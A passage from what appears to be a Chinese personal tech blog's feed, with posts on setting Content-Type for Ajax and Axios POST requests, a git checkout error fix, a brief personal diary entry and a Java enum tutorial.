class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))<br>            $.<span class="hljs-title function_">ajax</span>(&#123;<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>                <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>                &#125;),<br>                <span class="hljs-comment">// data:JSON.stringify(data),</span><br>                <span class="hljs-comment">/* headers: &#123;</span><br><span class="hljs-comment">                   &#x27;contentType&#x27;: &quot;application/json&quot;,</span><br><span class="hljs-comment">                &#125;, */</span><br>                <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>                <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                    <span class="hljs-comment">//处理返回数据</span><br>                &#125;,<br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225427165.png" alt="image-20221213225427165" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>               <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-comment">//  contentType: &quot;application/json&quot;,</span><br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-comment">// data:JSON.stringify(data),</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>                  <span class="hljs-string">&#x27;contentType&#x27;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//处理返回数据</span><br>               &#125;,<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225509717.png" alt="image-20221213225509717" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>               <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-comment">//  contentType: &quot;application/json&quot;,</span><br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-comment">// data:JSON.stringify(data),</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>                   <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//处理返回数据</span><br>               &#125;,<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225614536.png" alt="image-20221213225614536" /></p><p>Axios</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>           <span class="hljs-title function_">axios</span>(&#123;<br>               <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>               <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>               &#125;),<br>               <br>           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>               <span class="hljs-comment">//处理返回数据</span><br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225732777.png" alt="image-20221213225732777" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;),<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>                    <span class="hljs-comment">// &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br>                <br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//处理返回数据</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225830608.png" alt="image-20221213225830608" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;),<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br>                <br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//处理返回数据</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213225905831.png" alt="image-20221213225905831" /></p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><blockquote><p>注意</p></blockquote><p><strong>Ajax</strong>设置<code>Content-Type</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">contentType<span class="hljs-string">&#x27;: &quot;application/json&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br></code></pre></td></tr></table></figure><p><strong>Axios</strong>设置<code>Content-Type</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br></code></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">方式\数据类型</th><th style="text-align:center">JSON对象</th><th style="text-align:center">JSON字符串</th></tr></thead><tbody><tr><td style="text-align:center">Ajax（未设置Content-Type）</td><td style="text-align:center">Fromdata</td><td style="text-align:center">Fromdata(还有错误)</td></tr><tr><td style="text-align:center">Ajax（设置Content-Type）</td><td style="text-align:center">payload</td><td style="text-align:center">Json</td></tr><tr><td style="text-align:center">Axios（未设置Content-Type）</td><td style="text-align:center">Json</td><td style="text-align:center">Fromdata(还有错误)</td></tr><tr><td style="text-align:center">Axios（设置Content-Type）</td><td style="text-align:center">Json</td><td style="text-align:center">Json</td></tr></tbody></table><h2 id="axios发送post请求携带fromdata"><a class="markdownIt-Anchor" href="#axios发送post请求携带fromdata"></a> Axios发送Post请求，携带Fromdata</h2><p>Axios默认是发送JSON数据的，想要发送Fromdata数据。可以这样做</p><p>下载qs.js到本地，也可以使用CDN在线</p><p><a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a></p><p>使用 <code>qs</code> 组件，但是 <code>qs</code> 格式化会过滤空数组数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script src=<span class="hljs-string">&quot;plugins/qs/qs.js&quot;</span>&gt;&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">data</span>) =&gt; &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-keyword">return</span> $axios(&#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/oauth/oauth/token&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">headers</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">data</span>: <span class="hljs-title class_">Qs</span>.<span class="hljs-title function_">stringify</span>(data)</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;)</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>格式化出来的数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 数组无值</span><br>id: <span class="hljs-number">2086</span><br>intention: <br><br><span class="hljs-comment">// 数组有值</span><br>id: <span class="hljs-number">2086</span><br>intention: <br>follower_id<span class="hljs-selector-attr">[0]</span>: <span class="hljs-number">351</span><br>follower_id<span class="hljs-selector-attr">[1]</span>: <span class="hljs-number">66</span><br>concat_material<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[fname]</span>: 视频订单<span class="hljs-selector-class">.xls</span><br>concat_material<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[key]</span>: local/other/<span class="hljs-number">099</span>f4be38fb8e69bb031cbc36ed283a6<span class="hljs-selector-class">.xls</span><br>concat_material<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[fname]</span>: 视频订单<span class="hljs-number">1</span><span class="hljs-selector-class">.xls</span><br>concat_material<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[key]</span>: local/other/<span class="hljs-number">099</span>f4be38fb8e69bb031cbc36ed283a8.xls<br></code></pre></td></tr></table></figure><p>在springboot开发时</p><ol><li><strong>Fromdata</strong>使用注解 <code>@RequestParam</code> 也可以使用 <code>servletRequest.getAttribute(&quot;参数名&quot;)</code>获取</li><li>Json使用注解 <code>@RequestBody</code></li></ol>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ajax</tag>
      
      <tag>Axios</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git解决error-The following untracked working tree files would be overwritten by checkout</title>
    <link href="/2022/11/29/git%E8%A7%A3%E5%86%B3error%20The%20following%20untracked%20working%20tree%20files%20would%20be%20overwritten%20by%20checkout/"/>
    <url>/2022/11/29/git%E8%A7%A3%E5%86%B3error%20The%20following%20untracked%20working%20tree%20files%20would%20be%20overwritten%20by%20checkout/</url>
    
    <content type="html"><![CDATA[<h3 id="The-following-untracked-working-tree-files-would-be-overwritten-by-checkout"><a href="#The-following-untracked-working-tree-files-would-be-overwritten-by-checkout" class="headerlink" title="The following untracked working tree files would be overwritten by checkout:"></a>The following untracked working tree files would be overwritten by checkout:</h3><blockquote><p>可能只能解决我一个我的问题</p></blockquote><p>网上大都说是什么切换分支时出现这个错误。wnm，我就一个分支Master。</p><p>检查十几分钟发现</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221129090836068.png" alt="image-20221129090836068"></p><blockquote><p><strong>G盘</strong>里的<strong>Javacode</strong>才是我平时用到的文件夹。该目录下 <code>.git</code> 中的信息才和git远程仓库信息一致。</p></blockquote><blockquote><p><strong>F盘</strong>下<strong>Javacode</strong>，是我好久之前git版本回退的备份。</p></blockquote><ol><li><p>原因：</p><p>我在<strong>F盘</strong>下<strong>Javacode</strong>新建了一个项目(糊涂啊 :sob::sob::sob:），在push就出现<code>The following untracked working tree files would be overwritten by checkout:</code></p></li><li><p>解决：</p><p>把新建的项目移动到<strong>G盘</strong>里的<strong>Javacode</strong>，重新add commit push 远程仓库提交成功</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的1128_01</title>
    <link href="/2022/11/29/%E6%88%91%E7%9A%841128-01/"/>
    <url>/2022/11/29/%E6%88%91%E7%9A%841128-01/</url>
    
    <content type="html"><![CDATA[<h1 id="这一年"><a class="markdownIt-Anchor" href="#这一年"></a> 这一年</h1><p>🐱</p><p>真正的开始计算机的学习！！！</p><p>​开始卷了 😜😜😜</p><p>开始看了蜡笔小新，成为蜡笔小新的忠实粉丝 ！！！</p><p>​好下饭 ​ 😍😍😍</p><p>和老朋友联系变少了许多，偶尔联系的话，又聊得会忘记时间，多了几个新朋友 ！！！</p><p>​友谊万岁 ☺️☺️☺️</p>]]></content>
    
    
    <categories>
      
      <category>记录类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java-枚举(enum)</title>
    <link href="/2022/11/28/%E6%9E%9A%E4%B8%BE-enum/"/>
    <url>/2022/11/28/%E6%9E%9A%E4%B8%BE-enum/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-枚举-enum"><a href="#Java-枚举-enum" class="headerlink" title="Java 枚举(enum)"></a>Java 枚举(enum)</h1><p>Java 枚举是一个特殊的类，一般表示一组常量，比如一年的 4 个季节，一个年的 12 个月份，一个星期的 7 天，方向有东南西北等。</p><p>Java 枚举类使用 enum 关键字来定义，各个常量使用逗号 <strong>,</strong> 来分割。</p><h2 id="定义一个枚举"><a href="#定义一个枚举" class="headerlink" title="定义一个枚举"></a>定义一个枚举</h2><p>例如定义一个颜色的枚举类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span> <br>&#123; <br>    RED, GREEN, BLUE; <br>&#125; <br></code></pre></td></tr></table></figure><p>以上枚举类 Color 颜色常量有 RED, GREEN, BLUE，分别表示红色，绿色，蓝色。</p><p>使用实例：</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span><br>&#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>    &#123;<br>        RED, GREEN, BLUE;<br>    &#125;<br> <br>    <span class="hljs-comment">// 执行输出结果</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">Color</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Color.RED;<br>        System.out.println(c1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">RED</span><br></code></pre></td></tr></table></figure><h2 id="内部类中使用枚举"><a href="#内部类中使用枚举" class="headerlink" title="内部类中使用枚举"></a>内部类中使用枚举</h2><p>枚举类也可以声明在内部类中：</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span><br>&#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>    &#123;<br>        RED, GREEN, BLUE;<br>    &#125;<br> <br>    <span class="hljs-comment">// 执行输出结果</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">Color</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Color.RED;<br>        System.out.println(c1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">RED</span><br></code></pre></td></tr></table></figure><p>每个枚举都是通过 Class 在内部实现的，且所有的枚举值都是 public static final 的。</p><p>以上的枚举类 Color 转化在内部类实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span><br>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span> <span class="hljs-variable">RED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span> <span class="hljs-variable">BLUE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Color</span> <span class="hljs-variable">GREEN</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="迭代枚举元素"><a href="#迭代枚举元素" class="headerlink" title="迭代枚举元素"></a>迭代枚举元素</h2><p>可以使用 for 语句来迭代枚举元素：</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>&#123;<br>    RED, GREEN, BLUE;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-keyword">for</span> (Color myVar : Color.values()) &#123;<br>      System.out.println(myVar);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">RED</span><br><span class="hljs-attribute">GREEN</span><br><span class="hljs-attribute">BLUE</span><br></code></pre></td></tr></table></figure><h2 id="在-switch-中使用枚举类"><a href="#在-switch-中使用枚举类" class="headerlink" title="在 switch 中使用枚举类"></a>在 switch 中使用枚举类</h2><p>枚举类常应用于 switch 语句中：</p><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Color</span><br>&#123;<br>    RED, GREEN, BLUE;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Color</span> <span class="hljs-variable">myVar</span> <span class="hljs-operator">=</span> Color.BLUE;<br><br>    <span class="hljs-keyword">switch</span>(myVar) &#123;<br>      <span class="hljs-keyword">case</span> RED:<br>        System.out.println(<span class="hljs-string">&quot;红色&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> GREEN:<br>         System.out.println(<span class="hljs-string">&quot;绿色&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> BLUE:<br>        System.out.println(<span class="hljs-string">&quot;蓝色&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行以上代码输出结果为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 